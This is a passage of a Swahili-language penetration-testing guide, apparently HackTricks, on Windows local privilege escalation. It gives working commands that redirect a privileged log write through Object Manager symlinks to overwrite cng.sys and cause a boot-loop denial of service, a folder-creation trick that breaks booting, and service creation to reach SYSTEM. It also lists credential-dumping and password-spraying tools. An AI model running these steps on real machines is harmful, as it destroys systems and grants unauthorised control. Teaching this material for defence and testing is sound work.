Tumia primitive inayokuruhusu **kuunda folda popote kama SYSTEM/admin** — hata kama **huwezi kuandika faili** au **kuweka ruhusa dhaifu**.

Unda **folda** (si faili) yenye jina la **driver muhimu ya Windows**, kwa mfano:
```
C:\Windows\System32\cng.sys
```

- Njia hii kwa kawaida inalingana na driver ya kernel-mode `cng.sys`.
- Ukiitengeneza mapema kama folder, Windows hushindwa kupakia driver halisi wakati wa kuwasha.
- Kisha, Windows hujaribu kupakia `cng.sys` wakati wa kuwasha.
- Huona folder, hushindwa kutambua driver halisi, na mfumo hu-crash au kuwasha hukwama.
- Hakuna fallback wala recovery bila hatua za nje (kwa mfano, ukarabati wa kuwasha au ufikiaji wa diski).

### Kutoka kwenye njia za log/backup zenye ruhusa za juu + OM symlinks hadi kubadilisha faili yoyote / boot DoS

Huduma yenye ruhusa za juu inapoandika logs/exports kwenye njia iliyosomwa kutoka kwa config inayoweza kuandikwa, elekeza njia hiyo kwa kutumia Object Manager symlinks + NTFS mount points ili kubadilisha uandishi wenye ruhusa za juu kuwa ubadilishaji wa faili yoyote (hata bila SeCreateSymbolicLinkPrivilege).<sup>[[15]](#references)</sup>

**Mahitaji**
- Config inayohifadhi njia lengwa inaweza kuandikwa na mshambuliaji (kwa mfano, `%ProgramData%\...\.ini`).
- Uwezo wa kuunda mount point kuelekea `\RPC Control` na OM file symlink (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Operesheni yenye ruhusa za juu inayoandika kwenye njia hiyo (log, export, report).

**Mlolongo wa mfano**
1. Soma config ili kubaini mahali pa log penye ruhusa za juu, kwa mfano, `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` katika `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Elekeza upya njia hiyo bila ruhusa za admin:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Subiri component yenye privileged iandike log (kwa mfano, admin aanzishe "send test SMS"). Sasa write itaingia kwenye `C:\Windows\System32\cng.sys`.
4. Kagua target iliyoandikwa upya (hex/PE parser) ili kuthibitisha uharibifu; kuwasha upya kunalazimisha Windows kupakia driver iliyobadilishwa → **boot loop DoS**. Hii pia inatumika kwa faili yoyote iliyolindwa ambayo service yenye privileged itafungua kwa ajili ya kuandika.

> `cng.sys` kwa kawaida hupakiwa kutoka `C:\Windows\System32\drivers\cng.sys`, lakini ikiwa kuna nakala katika `C:\Windows\System32\cng.sys`, inaweza kujaribiwa kwanza, na hivyo kuwa sehemu ya kuaminika ya DoS kwa data iliyoharibika.



## **Kutoka High Integrity hadi System**

### **Service mpya**

Ikiwa tayari unaendesha process ya High Integrity, **njia ya kufikia SYSTEM** inaweza kuwa rahisi: **unda na utekeleze service mpya**:

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

> [!TIP]
> Unapotengeneza binary ya service, hakikisha ni service halali au binary inatekeleza vitendo vinavyohitajika haraka, kwa kuwa itazimwa baada ya sekunde 20 ikiwa si service halali.

### AlwaysInstallElevated

Kutoka kwenye mchakato wa High Integrity unaweza kujaribu **kuwasha maingizo ya registry ya AlwaysInstallElevated** na **kusakinisha** reverse shell kwa kutumia wrapper ya _**.msi**_.\
[Maelezo zaidi kuhusu registry keys zinazohusika na jinsi ya kusakinisha kifurushi cha _.msi_ hapa.](#alwaysinstallelevated)

### High + SeImpersonate privilege hadi System

**Unaweza** [**kupata code hapa**](seimpersonate-from-high-to-system.md)**.**

### Kutoka SeDebug + SeImpersonate hadi Full Token privileges

Ikiwa una token privileges hizo (huenda utazipata kwenye mchakato ambao tayari una High Integrity), utaweza **kufungua karibu mchakato wowote** (isipokuwa michakato iliyolindwa) kwa kutumia SeDebug privilege, **kunakili token** ya mchakato huo, na kuunda **mchakato wowote kwa kutumia token hiyo**.\
Kwa kawaida, mbinu hii **huchagua mchakato wowote unaoendeshwa kama SYSTEM wenye token privileges zote** (_ndiyo, unaweza kupata michakato ya SYSTEM isiyo na token privileges zote_).\
**Unaweza kupata** [**mfano wa code inayotekeleza mbinu iliyopendekezwa hapa**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Mbinu hii hutumiwa na meterpreter kufanya escalation kwenye `getsystem`. Mbinu hii inahusisha **kutengeneza pipe na kisha kuunda/ kutumia vibaya service ili iandike kwenye pipe hiyo**. Kisha, **server** iliyotengeneza pipe kwa kutumia privilege ya **`SeImpersonate`** itaweza **kuiga token** ya mteja wa pipe (service) na kupata SYSTEM privileges.\
Ukitaka [**kujifunza zaidi kuhusu name pipes, soma hapa**](#named-pipe-client-impersonation).\
Ukitaka kusoma mfano wa [**jinsi ya kutoka high integrity hadi System kwa kutumia name pipes, soma hapa**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Ukifanikiwa **kuteka dll** inayopakiwa na **mchakato** unaoendeshwa kama **SYSTEM**, utaweza kutekeleza code yoyote kwa ruhusa hizo. Kwa hiyo, Dll Hijacking pia ni muhimu kwa aina hii ya privilege escalation; zaidi ya hayo, ni **rahisi zaidi kuifanya kutoka kwenye mchakato wa high integrity**, kwa kuwa utakuwa na **ruhusa za kuandika** kwenye folda zinazotumiwa kupakia dlls.\
**Unaweza** [**kujifunza zaidi kuhusu Dll hijacking hapa**](dll-hijacking/index.html)**.**

### **Kutoka Administrator au Network Service hadi System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### Kutoka LOCAL SERVICE au NETWORK SERVICE hadi full privs

**Soma:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Zana muhimu

**Zana bora ya kutafuta njia za Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Hukagua misconfigurations na faili nyeti (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Imegunduliwa.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Hukagua baadhi ya misconfigurations zinazowezekana na kukusanya taarifa (**[**angalia hapa**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Hukagua misconfigurations**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- Hutoa taarifa za session zilizohifadhiwa za PuTTY, WinSCP, SuperPuTTY, FileZilla na RDP. Tumia -Thorough kwenye mfumo wa ndani.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Hutoa credentials kutoka Credential Manager. Imegunduliwa.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Hueneza passwords zilizokusanywa kwenye domain**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh ni zana ya PowerShell ya ADIDNS/LLMNR/mDNS spoofer na man-in-the-middle.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Windows enumeration ya msingi kwa privesc**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Hutafuta vulnerabilities zinazojulikana za privesc (IMEPITWA NA WAKATI; tumia Watson badala yake)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Ukaguzi wa ndani **(Unahitaji haki za Admin)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Hutafuta vulnerabilities zinazojulikana za privesc (inahitaji ku-compiliwa kwa VisualStudio) ([**iliyocompiliwa awali**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Hufanya enumeration ya host kutafuta misconfigurations (ni zana zaidi ya kukusanya taarifa kuliko privesc) (inahitaji ku-compiliwa) **(**[**iliyocompiliwa awali**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Hutoa credentials kutoka kwenye software nyingi (exe iliyocompiliwa awali inapatikana github)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- Port ya PowerUp kwenda C#**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Hukagua misconfiguration (executable iliyocompiliwa awali inapatikana github). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Hukagua misconfigurations zinazowezekana (exe kutoka python). Haipendekezwi. Haifanyi kazi vizuri kwenye Win10.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Zana iliyoundwa kwa kutegemea chapisho hili (haihitaji accesschk ili kufanya kazi vizuri, lakini inaweza kuitumia).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- Husoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (python ya ndani)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- Husoma matokeo ya **systeminfo** na kupendekeza exploits zinazofanya kazi (Python ya ndani)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Unahitaji ku-compili project kwa kutumia toleo sahihi la .NET ([tazama hapa](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Ili kuona toleo la .NET lililosakinishwa kwenye host ya mwathiriwa, unaweza kufanya hivi:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Misingi ya Windows Privilege Escalation](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [Kuinua privileges kwa kutumia vibaya ruhusa dhaifu za folda](http://www.greyhathacker.net/?p=738)
- [3] [Windows Privilege Escalation - orodha ya haraka](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Warsha ya Local Privilege Escalation ya Windows / Linux](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Mashambulizi ya Windows: AT ndiyo mtindo mpya (Rob Fuller & Chris Gates)](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [Privilege Escalation - Windows - Mwongozo Kamili wa OSCP](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - Privilege Escalation - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Mwongozo wa Windows Privilege Escalation](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Orodha ya ukaguzi ya Windows-Privilege-Escalation](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [Mbinu za Windows Privilege Escalation kwa Pentesters](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: Hadaa kupitia SMTP kwa kutumia Word VBA macro → kusimbua credential za hMailServer → Veeam CVE-2023-27532 hadi SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) na wizi wa kernel token](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Kumfuatilia Silver Fox: Paka na Panya kwenye Vivuli vya Kernel](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – Udhaifu wa Privileged File System uliopo kwenye mfumo wa SCADA](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Zana za Kupima Symbolic Link – Matumizi ya CreateSymlink](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [Kiungo cha Zamani. Kutumia Vibaya Symbolic Links kwenye Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (toleo la Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js Trust Falls: Utatuzi hatari wa moduli kwenye Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Moduli za Node.js: kupakia kutoka kwenye folda za `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - Changamoto za orodha ya ukaguzi ya C/C++, zimetatuliwa](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - Kazi ya RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - Hijack-service-binaries](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own na Microslop: Kuunganisha CLDFLT na Mashindano ya Kernel ya DirectX ili kupata Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [I/O Ring Moja ya Kuwatawala Wote: Primitive Kamili ya Read/Write kwenye Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Kutumia Vibaya Ufutaji Holela wa Faili ili Kuinua Privilege na Mbinu Nyingine Bora](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - Msimbo wa exploit wa FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – Mashambulizi ya WSUS Sehemu ya 2: CVE-2020-1013, Windows 10 Local Privilege Escalation ya Siku 1](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Kuchunguza Credential Manager na Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos Resource Based Constrained Delegation: Mabadiliko ya Image Yanaposababisha Privilege Escalation](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Kutoa Ssh Private Keys kutoka kwa Windows 10 Ssh Agent](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – Kubadilisha Seva za Sasisho za Biashara kuwa Viwanda vya Backdoor (0_o) – Sehemu ya 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – Kubadilisha Seva za Sasisho za Biashara kuwa Viwanda vya Backdoor (0_o) – Sehemu ya 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence - Privilege Escalation kupitia Ufutaji wa Folda ya Microsoft Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center - CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
- [43] [MDSec - Total Recall: Kurudia Njia Uliyopitia hadi NT AUTHORITY\SYSTEM](https://www.mdsec.co.uk/2026/02/total-recall-retracing-your-steps-back-to-nt-authoritysystem/)
- [44] [NCC Group - Ushauri wa Privilege Escalation kupitia shared-memory offsets za Windows MIDI Services](https://nccgroup.com/research/technical-advisory-microsoft-windows-midi-service-module-escalation-of-privileges-cve-2026-62688)
{{#include ../../banners/hacktricks-training.md}}
